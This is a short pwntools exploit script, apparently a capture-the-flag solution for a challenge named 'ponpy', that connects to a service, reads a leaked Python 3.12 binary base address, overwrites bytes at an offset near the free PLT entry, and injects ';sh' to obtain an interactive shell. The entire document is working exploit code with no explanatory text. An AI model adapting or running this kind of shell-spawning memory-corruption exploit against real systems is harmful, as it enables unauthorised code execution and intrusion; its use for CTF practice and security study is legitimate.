#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./python3.12/bin/python3.12')
libc = elf.libc

#p = remote("ponpy.ctfz.zone", 21337)
p = remote("127.0.0.1", 21337)
assert p

p.recvuntil(b'is ')
elf.address = int(p.recvline(), 16)
info(f"elf @ {hex(elf.address)}")

target_free_plt = elf.address + 0x10067a

p.sendlineafter(b'off: ', hex(target_free_plt).encode())
p.sendlineafter(b'loot: ', b'\xba\xbb' + b';sh')

p.interactive()

